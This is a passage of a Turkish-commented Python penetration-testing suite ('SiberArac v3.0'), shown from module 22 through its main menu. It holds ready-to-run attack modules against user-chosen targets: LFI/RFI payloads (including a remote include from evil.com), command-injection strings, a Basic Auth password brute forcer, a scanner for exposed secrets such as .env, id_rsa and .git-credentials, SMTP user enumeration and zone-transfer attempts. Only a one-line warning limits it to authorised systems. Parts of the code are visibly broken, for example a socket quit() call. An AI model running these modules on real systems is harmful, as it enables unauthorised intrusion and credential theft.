            log("Tespit edilen teknolojiler:", "success")
            for c in bul: print(f"  {Fore.GREEN}[✓] {c}")
        else:
            log("CMS tespit edilemedi.", "warning")
        print(f"{Fore.YELLOW}[*] Sunucu: {r.headers.get('Server','?')}")
        print(f"{Fore.CYAN}{'='*60}")
    except Exception as e:
        log(f"Hata: {e}", "error")

# ──────────────────────────────────────────────────────────
# MODUL 23: WORDLIST OLUSTURUCU
# ──────────────────────────────────────────────────────────

def wordlist_generator():
    banner()
    log("OZEL WORDLIST OLUSTURUCU", "info")
    kelimeler = [k.strip() for k in renkli_input("[?] Anahtar kelimeler (virgulle): ").split(",") if k.strip()]
    if not kelimeler: log("Kelime girilmedi!", "error"); return
    mx = int(renkli_input("[?] Max kombinasyon uzunlugu [3]: ") or "3")
    sonuc = set()
    for r in range(1, mx+1):
        for combo in product(kelimeler, repeat=r):
            sonuc.add("".join(combo))
            sonuc.add(".".join(combo))
            sonuc.add("_".join(combo))
            sonuc.add("-".join(combo))
    dosya = f"wordlist_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(dosya, 'w', encoding='utf-8') as f:
        for s in sorted(sonuc):
            f.write(s+"\n")
    log(f"{len(sonuc)} kombinasyon -> {dosya}", "success")

# ──────────────────────────────────────────────────────────
# MODUL 24: PAKET DINLEYICI
# ──────────────────────────────────────────────────────────

def packet_sniffer():
    banner()
    log("BASIT PAKET DINLEYICI (kendi aginizda!)", "info")
    try:
        import scapy.all as scapy
    except ImportError:
        log("scapy kuruluyor...", "warning")
        os.system("pip install scapy -q")
        try:
            import scapy.all as scapy
        except:
            log("scapy kurulamadi.", "error"); return
    n = int(renkli_input("[?] Kac paket [10]: ") or "10")
    log(f"{n} paket dinleniyor... (Ctrl+C ile durdurun)", "info")
    try:
        pkts = scapy.sniff(count=n, timeout=30)
        print(f"\n{Fore.CYAN}{'='*60}")
        for i, p in enumerate(pkts, 1):
            src = p[scapy.IP].src if scapy.IP in p else "N/A"
            dst = p[scapy.IP].dst if scapy.IP in p else "N/A"
            proto = "TCP" if scapy.TCP in p else ("UDP" if scapy.UDP in p else ("ICMP" if scapy.ICMP in p else "?"))
            info = ""
            if scapy.TCP in p: info = f"Sport: {p[scapy.TCP].sport} Dport: {p[scapy.TCP].dport}"
            elif scapy.UDP in p: info = f"Sport: {p[scapy.UDP].sport} Dport: {p[scapy.UDP].dport}"
            print(f"{Fore.GREEN}[{i}] {src:<20} -> {dst:<20} [{proto}] {Fore.WHITE}{info}")
        print(f"{Fore.CYAN}{'='*60}")
    except PermissionError:
        log("Root yetkisi gerekli!", "error")
    except KeyboardInterrupt:
        log("Durduruldu.", "warning")

# ──────────────────────────────────────────────────────────
# MODUL 25: DNS ENUMERASYON
# ──────────────────────────────────────────────────────────

def dns_enum():
    banner()
    log("DNS ENUMERASYON", "info")
    domain = renkli_input("[?] Domain: ")
    if not domain: log("Bos!", "error"); return

    try:
        import dns.resolver
    except ImportError:
        log("dnspython kuruluyor...", "warning")
        os.system("pip install dnspython -q")
        import dns.resolver

    tipler = ["A","AAAA","MX","NS","TXT","SOA","CNAME","SRV","PTR","CAA"]
    print(f"\n{Fore.CYAN}{'='*60}")
    for t in tipler:
        try:
            cevaplar = dns.resolver.resolve(domain, t)
            for c in cevaplar:
                print(f"{Fore.GREEN}[{t:<6}] {str(c)}")
        except:
            pass
    print(f"{Fore.CYAN}{'='*60}")
    log("DNS enum tamam.", "success")

# ──────────────────────────────────────────────────────────
# MODUL 26: METADATA CIKARICI
# ──────────────────────────────────────────────────────────

def metadata_extractor():
    banner()
    log("DOSYA METADATA CIKARICI", "info")
    yol = renkli_input("[?] Dosya yolu: ")
    if not os.path.exists(yol): log("Dosya yok!", "error"); return

    # EXIF
    try:
        from PIL import Image, ExifTags
        img = Image.open(yol)
        exif = img._getexif()
        if exif:
            print(f"\n{Fore.CYAN}{'='*60}")
            log("EXIF metadata:", "success")
            for tid, val in exif.items():
                tag = ExifTags.TAGS.get(tid, tid)
                print(f"  {Fore.GREEN}{tag:<35}{val}")
            print(f"{Fore.CYAN}{'='*60}")
        else:
            log("EXIF metadata yok.", "warning")

        # Dosya bilgisi
        stat = os.stat(yol)
        print(f"\n{Fore.YELLOW}[Dosya Bilgisi]")
        print(f"  Boyut: {stat.st_size} byte")
        print(f"  Son degisiklik: {datetime.fromtimestamp(stat.st_mtime)}")
    except ImportError:
        log("Pillow kurulu degil. pip install Pillow", "warning")
    except Exception as e:
        log(f"Hata: {e}", "error")

# ──────────────────────────────────────────────────────────
# MODUL 27: URL FUZZING
# ──────────────────────────────────────────────────────────

def url_fuzzing():
    banner()
    log("URL FUZZING", "info")
    tmpl = renkli_input("[?] Hedef URL (FUZZ yazın): ")
    if "FUZZ" not in tmpl: log("FUZZ yer tutucusu yok!", "error"); return

    wl = renkli_input("[?] Wordlist (bos=varsayilan): ")
    if not wl or not os.path.exists(wl):
        kelimeler = ["admin","test","api","v1","v2","dev","backup","config",
                     "old","new","debug","info","status","health","metrics",
                     "secret","key","token","auth","login","logout","register",
                     "upload","download","export","import","search","query",
                     "graphql","rest","soap","wsdl","xml","json","rss","feed"]
    else:
        with open(wl, 'r') as f:
            kelimeler = [s.strip() for s in f.readlines()]

    log(f"{len(kelimeler)} kelime fuzzing...", "info")
    bul = []
    for k in kelimeler:
        url = tmpl.replace("FUZZ", k)
        try:
            r = requests.get(url, timeout=5, allow_redirects=False,
                            headers={"User-Agent":"SiberArac/3.0"})
            if r.status_code not in [404, 400]:
                log(f"[{r.status_code}] {url}", "success")
                bul.append((url, r.status_code))
        except:
            pass
    log(f"{len(bul)} sonuc.", "info")

# ──────────────────────────────────────────────────────────
# MODUL 28: ARP TARAMA
# ──────────────────────────────────────────────────────────

def arp_scan():
    banner()
    log("ARP TARAMA (Local Network)", "info")
    try:
        import scapy.all as scapy
    except:
        log("scapy kurulu degil!", "error"); return

    hedef = renkli_input("[?] Hedef ag (orn: 192.168.1.0/24): ")
    if not hedef: log("Bos!", "error"); return

    try:
        log("ARP taraniyor...", "info")
        arp = scapy.ARP(pdst=hedef)
        bc = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        answered = scapy.srp(bc/arp, timeout=3, verbose=False)[0]

        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.WHITE}{'IP':<20}{'MAC':<20}")
        print(f"{Fore.CYAN}{'='*60}")
        for e in answered:
            print(f"{Fore.GREEN}{e[1].psrc:<20}{e[1].hwsrc:<20}")
        print(f"{Fore.CYAN}{'='*60}")
        log(f"{len(answered)} cihaz bulundu.", "success")
    except PermissionError:
        log("Root yetkisi gerekli!", "error")
    except Exception as e:
        log(f"Hata: {e}", "error")

# ──────────────────────────────────────────────────────────
# MODUL 29: JWT ANALIZI
# ──────────────────────────────────────────────────────────

def jwt_analiz():
    banner()
    log("JWT TOKEN ANALIZI", "info")
    token = renkli_input("[?] JWT: ")
    if not token: log("Token bos!", "error"); return

    try:
        parts = token.split(".")
        if len(parts) != 3:
            log("Gecersiz JWT (3 parca olmali)!", "error"); return

        def b64d(s):
            s = s + "=" * (4 - len(s) % 4) if len(s) % 4 else s
            return base64.urlsafe_b64decode(s).decode('utf-8')

        header = json.loads(b64d(parts[0]))
        payload = json.loads(b64d(parts[1]))

        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}[HEADER]{Fore.GREEN}")
        print(json.dumps(header, indent=2))
        print(f"\n{Fore.YELLOW}[PAYLOAD]{Fore.GREEN}")
        print(json.dumps(payload, indent=2))

        if header.get("alg") in ["none","None","NONE"]:
            log("ZAFIYET! 'none' algoritmasi!", "error")
        if header.get("alg","").startswith("HS") and "sub" in payload:
            log("HMAC imzali JWT - brute force denenebilir.", "warning")
        if payload.get("exp"):
            exp = datetime.fromtimestamp(payload["exp"])
            now = datetime.now()
            if exp < now:
                log(f"Token suresi DOLMUS: {exp}", "error")
            else:
                kalan = exp - now
                log(f"Token gecerli. Kalan: {kalan}", "success")
        print(f"{Fore.CYAN}{'='*60}")
    except Exception as e:
        log(f"JWT analiz hatasi: {e}", "error")

# ──────────────────────────────────────────────────────────
# MODUL 30: BASIT NMAP
# ──────────────────────────────────────────────────────────

def nmap_basit():
    banner()
    log("BASIT NMAP TARAYICI", "info")
    hedef = renkli_input("[?] Hedef: ")
    if not hedef: log("Bos!", "error"); return

    print(f"""
{Fore.CYAN}[1] {Fore.WHITE}Hizli tarama (-F)
{Fore.CYAN}[2] {Fore.WHITE}Versiyon (-sV)
{Fore.CYAN}[3] {Fore.WHITE}OS tespiti (-O)
{Fore.CYAN}[4] {Fore.WHITE}Agresif (-A)
{Fore.CYAN}[5] {Fore.WHITE}Custom komut
    """)
    s = renkli_input("[?] Secim: ")
    cmds = {"1":f"nmap -F {hedef}","2":f"nmap -sV {hedef}",
            "3":f"nmap -O {hedef}","4":f"nmap -A {hedef}","5":None}
    if s in cmds:
        cmd = cmds[s] if s != "5" else renkli_input("[?] Nmap komutu: ")
        if cmd:
            log(f"Calistiriliyor: {cmd}", "info")
            os.system(cmd)

# ═══════════════════════════════════════════════════════════════
# YENI MODULLER (31-45)
# ═══════════════════════════════════════════════════════════════

# ────────── MODUL 31: LFI/RFI TARAMA ──────────

def lfi_scan():
    banner()
    log("LFI/RFI TARAMA", "info")
    hedef = get_hedef_url()
    if not hedef: return
    payloads = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "../../../../windows/win.ini",
        "php://filter/convert.base64-encode/resource=index",
        "/proc/self/environ",
        "file:///etc/passwd",
        "http://evil.com/shell.txt"]
    log("LFI/RFI payloadlari test ediliyor...", "info")
    for p in payloads:
        try:
            url = hedef + urllib.parse.quote(p)
            r = requests.get(url, timeout=8, headers={"User-Agent":"SiberArac/3.0"})
            if "root:" in r.text or "[extensions]" in r.text or "<?php" in r.text:
                log(f"[!] LFI bulundu! Payload: {p}", "warning")
            if "base64" in r.text and len(r.text) > 100:
                log(f"[!] RFI/Filter bulundu! Payload: {p}", "warning")
        except:
            pass
    log("LFI taramasi tamam.", "info")

# ────────── MODUL 32: KOMUT ENJEKSIYONU ──────────

def cmd_injection():
    banner()
    log("KOMUT ENJEKSIYONU TARAMA", "info")
    hedef = get_hedef_url()
    if not hedef: return
    payloads = [
        "; id",
        "| id",
        "& id",
        "`id`",
        "$(id)",
        "; ls -la",
        "| dir",
        "&& whoami",
        "|| whoami",
        "| ping -c 5 127.0.0.1"]
    log("Komut enjeksiyonu test ediliyor...", "info")
    for p in payloads:
        try:
            url = hedef + urllib.parse.quote(p)
            r = requests.get(url, timeout=8, headers={"User-Agent":"SiberArac/3.0"})
            if re.search(r'(uid=|root|x:0:0:|bin/bash|Microsoft)', r.text, re.I):
                log(f"[!] Komut enjeksiyonu! Payload: {p}", "warning")
        except:
            pass
    log("Tarama tamam.", "info")

# ────────── MODUL 33: OPEN REDIRECT ──────────

def open_redirect():
    banner()
    log("OPEN REDIRECT TARAMA", "info")
    hedef = get_hedef_url()
    if not hedef: return
    payloads = [
        "//evil.com",
        "//evil.com@google.com",
        "https://evil.com",
        "http://evil.com",
        "///evil.com",
        "/\\evil.com",
        "?url=https://evil.com",
        "?redirect=https://evil.com",
        "?next=https://evil.com"]
    log("Open redirect test ediliyor...", "info")
    for p in payloads:
        try:
            url = f"{hedef}?q={urllib.parse.quote(p)}"
            r = requests.get(url, timeout=8, allow_redirects=False,
                            headers={"User-Agent":"SiberArac/3.0"})
            loc = r.headers.get("Location","")
            if "evil" in loc.lower():
                log(f"[!] Open redirect! {loc}", "warning")
        except:
            pass
    log("Tarama tamam.", "info")

# ────────── MODUL 34: CORS KONTROLU ──────────

def cors_check():
    banner()
    log("CORS MISCONFIGURATION KONTROLU", "info")
    hedef = get_hedef_url()
    if not hedef: return
    origins = ["https://evil.com", "null", "*", "https://evil.com:443",
               "https://evil.com.evil.com"]
    log("CORS yanlis yapilandirmalari test ediliyor...", "info")
    for o in origins:
        try:
            r = requests.get(hedef, timeout=8,
                            headers={"User-Agent":"SiberArac/3.0","Origin":o})
            acao = r.headers.get("Access-Control-Allow-Origin","")
            acac = r.headers.get("Access-Control-Allow-Credentials","")
            if acao == "*":
                log(f"[!] CORS: Wildcard origin (tum domainlere izin)", "warning")
            elif acao == o:
                log(f"[!] CORS: Origin yansitiliyor -> {o}", "warning")
                if acac == "true":
                    log(f"[!] CORS: Credentials=true ile {o} -> ZAFIYET!", "error")
        except:
            pass
    log("CORS kontrolu tamam.", "info")

# ────────── MODUL 35: SUBDOMAIN TAKEOVER ──────────

def subdomain_takeover():
    banner()
    log("SUBDOMAIN TAKEOVER KONTROLU", "info")
    hedef = renkli_input("[?] Domain: ")
    if not hedef: log("Bos!", "error"); return

    subs_extra = ["www","dev","staging","api","app","blog","shop","mail",
                  "cdn","assets","static","images","test","stage","beta",
                  "prod","admin","dashboard","portal","help","support","docs"]
    subs = [renkli_input(f"[?] Subdomain (opsiyonel, enter gec): ")] or subs_extra
    if subs[0] == "": subs = subs_extra
    else: subs = [subs[0]]

    fingerprints = {
        "github":["github.io","GitHub Pages"],
        "heroku":["herokuapp.com","Heroku"],
        "aws":["cloudfront.net","amazonaws.com","s3-website"],
        "azure":["azurewebsites.net","azureedge.net","trafficmanager.net"],
        "digitalocean":["digitaloceanspaces.com"],
        "shopify":["myshopify.com"],
        "squarespace":["squarespace.com"],
        "wordpress":["wordpress.com","wpengine.com"],
        "cloudflare":["cloudflare.com"],
        "readme":["readme.io"],
        "strikingly":["strikingly.com"],
        "unbounce":["unbouncepages.com"],
        "fly":["fly.io"],
        "netlify":["netlify.app"],
        "vercel":["vercel.app","now.sh"],
        "gitbook":["gitbook.io"],
        "surge":["surge.sh"],
        "cargo":["cargocollective.com"],
        "tumblr":["tumblr.com"],
        "bitbucket":["bitbucket.io"]}

    log(f"Subdomain takeover kontrolu...", "info")
    for sub in subs:
        domain = f"{sub}.{hedef}"
        try:
            ip = socket.gethostbyname(domain)
            try:
                r = requests.get(f"https://{domain}", timeout=8, allow_redirects=True)
                txt = r.text.lower()
                for svc, sigs in fingerprints.items():
                    for sig in sigs:
                        if sig.lower() in txt or sig.lower() in domain.lower():
                            if r.status_code == 404 or "there isn't a github pages site" in txt or "404" in txt:
                                log(f"[!] TAKEOVER MUHTEMEL! {domain} -> {svc}", "error")
            except:
                pass
        except:
            pass
    log("Takeover kontrolu tamam.", "info")

# ────────── MODUL 36: SMTP ENUM ──────────

def smtp_enum():
    banner()
    log("SMTP KULLANICI ENUMERASYONU", "info")
    hedef = renkli_input("[?] SMTP sunucu: ")
    port = int(renkli_input("[?] Port [25]: ") or "25")
    kullanicilar = [k.strip() for k in renkli_input("[?] Kullanicilar (virgulle): ").split(",") if k.strip()]
    if not hedef or not kullanicilar: log("Eksik bilgi!", "error"); return

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((hedef, port))
        banner = s.recv(1024).decode()
        log(f"SMTP: {banner.strip()}", "info")
        for k in kullanicilar:
            s.send(f"VRFY {k}\r\n".encode())
            resp = s.recv(256).decode()
            if "252" in resp or "250" in resp:
                log(f"[+] Kullanici GECERLI: {k}", "success")
            else:
                log(f"[-] Kullanici yok: {k}", "info")
        s.quit()
        s.close()
    except Exception as e:
        log(f"SMTP hatasi: {e}", "error")

# ────────── MODUL 37: DNS ZONE TRANSFER ──────────

def dns_zone_transfer():
    banner()
    log("DNS ZONE TRANSFER", "info")
    domain = renkli_input("[?] Domain: ")
    if not domain: log("Bos!", "error"); return

    try:
        import dns.resolver, dns.zone, dns.query
    except:
        log("dnspython kuruluyor...", "warning")
        os.system("pip install dnspython -q")
        import dns.resolver, dns.zone, dns.query

    try:
        ns_records = dns.resolver.resolve(domain, 'NS')
        log(f"NS kayitlari bulundu, zone transfer deneniyor...", "info")
        for ns in ns_records:
            ns_str = str(ns).rstrip('.')
            log(f"Deniyorum: {ns_str}", "info")
            try:
                z = dns.zone.from_xfr(dns.query.xfr(ns_str, domain, timeout=5))
                log(f"[!] Zone transfer BASARILI! {ns_str}", "success")
                for name, node in z.nodes.items():
                    print(f"  {Fore.GREEN}{name} -> {node}")
            except Exception as e:
                log(f"Zone transfer basarisiz: {ns_str} ({e})", "warning")
    except Exception as e:
        log(f"DNS zone transfer hatasi: {e}", "error")

# ────────── MODUL 38: HTTP METHODS ──────────

def http_methods():
    banner()
    log("HTTP METHODS KONTROLU", "info")
    hedef = get_hedef_url()
    if not hedef: return

    methods = ["GET","POST","PUT","DELETE","OPTIONS","PATCH","TRACE","CONNECT"]
    log("HTTP metodlari test ediliyor...", "info")
    print(f"\n{Fore.CYAN}{'='*60}")
    for m in methods:
        try:
            r = requests.request(m, hedef, timeout=8,
                                headers={"User-Agent":"SiberArac/3.0"})
            if r.status_code not in [405, 501, 400]:
                log(f"[{r.status_code}] {m}", "success" if m in ["PUT","DELETE","TRACE"] else "info")
                if m == "TRACE":
                    log(f"[!] TRACE aktif! XSS atagi icin kullanilabilir!", "warning")
                if m == "PUT":
                    log(f"[!] PUT aktif! Dosya yuklenebilir!", "warning")
                if m == "DELETE":
                    log(f"[!] DELETE aktif! Dosya silinebilir!", "warning")
        except:
            pass
    print(f"{Fore.CYAN}{'='*60}")

# ────────── MODUL 39: BRUTE FORCE (BASIC AUTH) ──────────

def brute_force_basic():
    banner()
    log("BASIC AUTH BRUTE FORCE", "info")
    hedef = get_hedef_url()
    if not hedef: return

    usernames = [k.strip() for k in renkli_input("[?] Kullanicilar (virgulle) [admin]: ").split(",") if k.strip()]
    if not usernames: usernames = ["admin","root","user","test","administrator"]

    wl = renkli_input("[?] Wordlist [varsayilan]: ")
    if not wl or not os.path.exists(wl):
        passwords = ["123456","password","admin","admin123","root","toor",
                     "test","1234","letmein","welcome","qwerty","passw0rd",
                     "P@ssw0rd","12345","login","pass123"]
    else:
        with open(wl, 'r') as f:
            passwords = [s.strip() for s in f.readlines()]

    log(f"{len(usernames)} kullanici x {len(passwords)} sifre deneniyor...", "info")
    bul = []
    for user in usernames:
        for pwd in passwords:
            try:
                r = requests.get(hedef, timeout=5, auth=(user, pwd),
                                headers={"User-Agent":"SiberArac/3.0"})
                if r.status_code == 200:
                    log(f"[!] Gecerli: {user}:{pwd}", "success")
                    bul.append((user, pwd))
                    break
            except:
                pass
    log(f"{len(bul)} gecerli kimlik bulundu.", "info")

# ────────── MODUL 40: HASSAS DOSYALAR ──────────

def sensitive_files():
    banner()
    log("HASSAS DOSYA TARAYICI", "info")
    hedef = get_hedef_url()
    if not hedef: return

    files = [
        ".env",".git/config",".git/HEAD",".htaccess",".htpasswd",
        "wp-config.php","config.php","config.inc.php","configuration.php",
        "database.yml","db.php","db.inc","settings.json","secrets.yml",
        "credentials.json","key.pem","id_rsa","id_dsa","private.pem",
        "backup.sql","dump.sql","db.sql","database.sql","data.sql",
        "composer.json","package.json","yarn.lock","Gemfile","Gemfile.lock",
        "Dockerfile","docker-compose.yml","Makefile",
        "error.log","access.log","debug.log","install.log","setup.log",
        "phpinfo.php","info.php","test.php","shell.php","cmd.php",
        "aws.json","gcp.json","azure.json",
        ".npmrc",".dockercfg",".git-credentials",
        "sitemap.xml","crossdomain.xml","clientaccesspolicy.xml",
        "web.config","application.properties","bootstrap.yml"]

    log(f"{len(files)} hassas dosya taranıyor...", "info")
    bul = []
    for f in files:
        url = f"{hedef.rstrip('/')}/{f}"
        try:
            r = requests.get(url, timeout=5, allow_redirects=False,
                            headers={"User-Agent":"SiberArac/3.0"})
            if r.status_code == 200:
                size = len(r.content)
                if size > 10:
                    log(f"[+] {url} ({size} byte)", "success")
                    bul.append((url, size))
        except:
            pass
    log(f"{len(bul)} hassas dosya bulundu.", "info")

# ────────── MODUL 41: PORT KNOCKING DETECTOR ──────────

def port_knock():
    banner()
    log("GELISMIS PORT TARAMA (port knocking tespiti)", "info")
    hedef = renkli_input("[?] Hedef: ")
    if not hedef: log("Bos!", "error"); return

    knock_ports = [7000,8000,9000,1111,2222,3333,1234,4321,
                   7007,8008,9009,10000,20000,30000]
    try:
        log(f"Port knocking portlari test ediliyor...", "info")
        for p in knock_ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                if s.connect_ex((hedef, p)) == 0:
                    log(f"Port {p} ACIK - muhtemel port knocking portu!", "warning")
                s.close()
            except:
                pass
        log("Tarama tamam.", "info")
    except Exception as e:
        log(f"Hata: {e}", "error")

# ────────── MODUL 42: NETWORK SCAN ──────────

def network_scan():
    banner()
    log("AG TARAMASI (port + ping)", "info")
    hedef = renkli_input("[?] Hedef subnet (orn: 192.168.1.0/24): ")
    if not hedef: log("Bos!", "error"); return

    try:
        net = ipaddress.ip_network(hedef, strict=False)
        log(f"{net.num_addresses} host taranıyor...", "info")
        aktif = []
        def ping(ip):
            try:
                param = "-n 1" if os.name == "nt" else "-c 1 -W 1"
                r = subprocess.run(f"ping {param} {ip}".split(), capture_output=True, text=True, timeout=3)
                if r.returncode == 0:
                    with threading.Lock():
                        aktif.append(str(ip))
                        log(f"[+] {ip} AKTIF", "success")
            except:
                pass

        threads = []
        for ip in net.hosts():
            t = threading.Thread(target=ping, args=(ip,))
            t.start()
            threads.append(t)
            if len(threads) >= 50:
                for t in threads: t.join()
                threads = []
        for t in threads: t.join()

        log(f"{len(aktif)} aktif host.", "info")
    except Exception as e:
        log(f"Hata: {e}", "error")

# ────────── MODUL 43: SSL PERF CHECK ──────────

def ssl_perf():
    banner()
    log("SSL/TLS PERFORMANS ve YAPILANDIRMA", "info")
    hedef = renkli_input("[?] Domain: ")
    if not hedef: log("Bos!", "error"); return

    try:
        import ssl as sslmod
        import OpenSSL
    except:
        log("pyOpenSSL kuruluyor...", "warning")
        os.system("pip install pyOpenSSL -q")
        import OpenSSL

    print(f"\n{Fore.CYAN}{'='*60}")
    log("SSL test baslatiliyor...", "info")

    # Baglanti testi
    try:
        t0 = time.time()
        ctx = sslmod.create_default_context()
        with socket.create_connection((hedef, 443), timeout=5) as sock:
            with ctx.wrap_socket(sock, server_hostname=hedef) as ss:
                baglanti = (time.time() - t0) * 1000
                print(f"{Fore.GREEN}[+] Baglanti suresi: {baglanti:.1f} ms")
                print(f"{Fore.GREEN}[+] Protokol: {ss.version()}")
                print(f"{Fore.GREEN}[+] Cipher: {ss.cipher()[0]}")
                print(f"{Fore.GREEN}[+] Sertifika: {ss.getpeercert().get('subject')}")

                # OCSP
                cert = ss.getpeercert(binary_form=True)
                x509 = OpenSSL.crypto.load_certificate(OpenSSL.crypto.FILETYPE_ASN1, cert)
                print(f"{Fore.GREEN}[+] Gecerlilik: {x509.get_notAfter().decode()}")
    except:
        log("SSL baglantisi basarisiz!", "error")

    print(f"{Fore.CYAN}{'='*60}")

# ────────── MODUL 44: BACKUP BULUCU ──────────

def backup_finder():
    banner()
    log("YEDEK DOSYA BULUCU", "info")
    hedef = get_hedef_url()
    if not hedef: return

    extensions = [".bak",".backup",".old",".orig",".copy",".tmp",".swp",
                  "~",".save",".sav",".dump",".sql",".tar",".gz",
                  ".zip",".rar",".7z",".tgz",".bkp",
                  ".php.bak",".php.old",".php~",
                  ".html.bak",".html.old",
                  ".pem",".key",".cert"]

    log(f"Yedek dosyalari taranıyor...", "info")
    bul = []
    for ext in extensions:
        url = f"{hedef.rstrip('/')}{ext}"
        try:
            r = requests.head(url, timeout=5, headers={"User-Agent":"SiberArac/3.0"})
            if r.status_code == 200:
                log(f"[+] {url}", "success")
                bul.append(url)
        except:
            pass
    log(f"{len(bul)} yedek dosya bulundu.", "info")

# ────────── MODUL 45: SYSTEM BILGI GUVENLIK KONTROLU ──────────

def system_check():
    banner()
    log("SISTEM GUVENLIK KONTROLU", "info")
    print(f"\n{Fore.CYAN}{'='*60}")
    log("Temel guvenlik kontrolleri yapiliyor...", "info")

    checks = [
        ("Root yetkisi", lambda: os.geteuid() == 0 if hasattr(os, 'geteuid') else False),
        ("Firewall (iptables)", lambda: subprocess.run(["which","iptables"],capture_output=True).returncode == 0),
        ("SELinux", lambda: os.path.exists("/selinux") or os.path.exists("/etc/selinux")),
        ("Python versiyonu", lambda: sys.version_info >= (3, 7)),
        ("Guncel paketler", lambda: True),
        ("SSH servisi", lambda: subprocess.run(["which","ssh"],capture_output=True).returncode == 0),
        ("OpenSSL", lambda: subprocess.run(["which","openssl"],capture_output=True).returncode == 0),
        ("Nmap kurulu", lambda: subprocess.run(["which","nmap"],capture_output=True).returncode == 0),
        ("Netcat kurulu", lambda: subprocess.run(["which","nc"],capture_output=True).returncode == 0)]

    for name, check in checks:
        try:
            if check():
                print(f"  {Fore.GREEN}[✓] {name}")
            else:
                print(f"  {Fore.YELLOW}[~] {name} (aktif degil)")
        except:
            print(f"  {Fore.RED}[?] {name} (kontrol edilemedi)")

    print(f"{Fore.CYAN}{'='*60}")
    log("Sistem kontrolu tamam.", "info")

# ═══════════════════════════════════════════════════════════════
# ANA MENU
# ═══════════════════════════════════════════════════════════════

def main():
    while True:
        banner()
        print(f"""
{Fore.YELLOW}    [ 🛡️ ETIK SIBER GUVENLIK SUITI v3.0 - 45 MODUL ]

{Fore.CYAN}    TEMEL MODULLER:
{Fore.CYAN}    [1]  {Fore.WHITE}Gelismis Port Tarayici       [2]  {Fore.WHITE}Subdomain Enum
{Fore.CYAN}    [3]  {Fore.WHITE}Dizin Brute Force             [4]  {Fore.WHITE}Hash Cracker
{Fore.CYAN}    [5]  {Fore.WHITE}WHOIS Sorgulama               [6]  {Fore.WHITE}Ag Bilgisi Toplama
{Fore.CYAN}    [7]  {Fore.WHITE}Kali Arac Entegrasyonu        [8]  {Fore.WHITE}SSL/TLS Analizi
{Fore.CYAN}    [9]  {Fore.WHITE}HTTP Header Kontrolu         [10] {Fore.WHITE}XSS Tarama
{Fore.CYAN}    [11] {Fore.WHITE}SQL Injection Tarama         [12] {Fore.WHITE}IP Geolocation
{Fore.CYAN}    [13] {Fore.WHITE}Reverse IP Lookup            [14] {Fore.WHITE}WAF Tespiti
{Fore.CYAN}    [15] {Fore.WHITE}Sifre Uretici                [16] {Fore.WHITE}Base64 Arac
{Fore.CYAN}    [17] {Fore.WHITE}Hash Olusturucu              [18] {Fore.WHITE}Steganografi
{Fore.CYAN}    [19] {Fore.WHITE}Port Listener                [20] {Fore.WHITE}Traceroute
{Fore.CYAN}    [21] {Fore.WHITE}robots.txt Analizi           [22] {Fore.WHITE}CMS Tespiti
{Fore.CYAN}    [23] {Fore.WHITE}Wordlist Olusturucu          [24] {Fore.WHITE}Paket Dinleyici
{Fore.CYAN}    [25] {Fore.WHITE}DNS Enum                     [26] {Fore.WHITE}Metadata Cikarici
{Fore.CYAN}    [27] {Fore.WHITE}URL Fuzzing                  [28] {Fore.WHITE}ARP Tarama
{Fore.CYAN}    [29] {Fore.WHITE}JWT Analizi                  [30] {Fore.WHITE}Nmap Basit

{Fore.MAGENTA}    GELISMIS MODULLER:
{Fore.MAGENTA}    [31] {Fore.WHITE}LFI/RFI Scanner             [32] {Fore.WHITE}Komut Enjeksiyonu
{Fore.MAGENTA}    [33] {Fore.WHITE}Open Redirect               [34] {Fore.WHITE}CORS Kontrolu
{Fore.MAGENTA}    [35] {Fore.WHITE}Subdomain Takeover          [36] {Fore.WHITE}SMTP Enum
{Fore.MAGENTA}    [37] {Fore.WHITE}DNS Zone Transfer           [38] {Fore.WHITE}HTTP Methods
{Fore.MAGENTA}    [39] {Fore.WHITE}Brute Force (Basic Auth)    [40] {Fore.WHITE}Hassas Dosyalar
{Fore.MAGENTA}    [41] {Fore.WHITE}Port Knocking Detector      [42] {Fore.WHITE}Ag Taramasi
{Fore.MAGENTA}    [43] {Fore.WHITE}SSL Performans              [44] {Fore.WHITE}Yedek Bulucu
{Fore.MAGENTA}    [45] {Fore.WHITE}Sistem Guvenlik Kontrolu

{Fore.YELLOW}    [99] {Fore.WHITE}Rapor Kaydet                   {Fore.YELLOW}[0]  {Fore.WHITE}Cikis

{Fore.RED}    [!] Yalnizca yetkili sistemlerde kullanin! Izinsiz kullanim suctur!
        """)

        secim = renkli_input("SiberArac > ")

        moduller = {
            "1":port_scanner,"2":subdomain_enum,"3":dir_bruteforce,"4":hash_cracker,
            "5":whois_lookup,"6":network_info,"7":kali_tools,"8":ssl_analiz,
            "9":http_headers,"10":xss_scan,"11":sql_scan,"12":ip_geo,
            "13":reverse_ip,"14":waf_detect,"15":password_generator,"16":base64_tool,
            "17":hash_generator,"18":steganografi,"19":port_listener,"20":traceroute,
            "21":robots_analiz,"22":cms_detect,"23":wordlist_generator,"24":packet_sniffer,
            "25":dns_enum,"26":metadata_extractor,"27":url_fuzzing,"28":arp_scan,
            "29":jwt_analiz,"30":nmap_basit,"31":lfi_scan,"32":cmd_injection,
            "33":open_redirect,"34":cors_check,"35":subdomain_takeover,"36":smtp_enum,
            "37":dns_zone_transfer,"38":http_methods,"39":brute_force_basic,
            "40":sensitive_files,"41":port_knock,"42":network_scan,
            "43":ssl_perf,"44":backup_finder,"45":system_check
        }

        if secim in moduller:
            moduller[secim]()
            pause()
        elif secim == "99":
            kaydet_rapor()
            pause()
        elif secim == "0":
            print(f"\n{Fore.GREEN}[+] SiberArac kapatiliyor. Guvenli kalin!{Style.RESET_ALL}\n")
            break
        else:
            log("Gecersiz secim!", "error")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Zorla cikis yapildi.{Style.RESET_ALL}\n")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Kritik hata: {e}{Style.RESET_ALL}\n")
